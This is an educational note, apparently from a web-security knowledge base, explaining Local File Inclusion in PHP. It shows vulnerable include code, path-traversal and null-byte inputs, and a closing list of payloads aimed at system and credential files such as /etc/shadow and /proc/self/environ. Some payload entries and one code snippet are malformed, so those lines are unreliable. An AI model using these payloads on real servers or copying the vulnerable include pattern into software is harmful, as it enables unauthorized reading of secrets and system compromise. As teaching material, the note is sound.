---
tags:
  - web
---
> Local File Inclusion (also known as LFI) allows an attacker to include files in server-side through the web browser. File inclusions are part of every advanced server-side scripting language on the web.LFI is commonly found to affect web applications that rely on a scripting runtime. This occurs mainly due to a bad input validation mechanism, wherein the user’s input is passed to the file include commands without proper validation.

### Impact
A successful LFI may result in compromise of the system, data leakage etc. The attacker can read, write, download files and can also run arbitrary codes with privileges of the web server.

### Local file inclusion in PHP
Consider an example as follows where we can apply this attack. http://victim_site/abc.php?file=userinput.txt The value of “file” parameter is taken into the following PHP code, and the file is included

```php
<?php
   $file = $_GET['file'];
   if(isset($file))
   {
       include("pages/$file");
   }
?>
```

An attacker may give malicious input for the "file" parameter which may give unauthorized files in that directory, he can also change the directories by using characters like "../". He can access the user credentials by giving input as "../../../../etc/passwd".In some cases where the file extension is added by default, we can avoid it by adding null byte terminator " %00". Any character after this special character will be ignored.

Suppose that the input given is taken by the following code and the default extension being set is “.php”. 

```php
<?php
“include/”.include($_GET[‘testfile’].”.php”);
?>
```

by giving file=../../../../etc/passwd%00 we can access the file by passing the ".php" extension.

An attacker can also download files by changing the file names. For example
	`example/?download=broucher.pdf`
The attacker may change the broucher.pdf to any other file such as passwords.txt, users.txt etc.

### Example payloads
* ../../../../etc/passwd/etc/issue
* ../../../../etc/passwd
* ../../../../etc/passwd/etc/shadow
* ../../../../etc/passwd/etc/group
* ../../../../etc/passwd/etc/hosts
* ../../../../etc/passwd/etc/motd
* ../../../../etc/passwd/etc/mysql/my.cnf
* ../../../../proc/self/environ
* ../../../../proc/version
* ../../../../proc/cmdline
* ../../../../proc/sched_debug
* ../../../../proc/mounts
* ../../../../proc/net/arp
* ../../../../proc/net/route
* ../../../../proc/net/tcp
* ../../../../proc/net/udp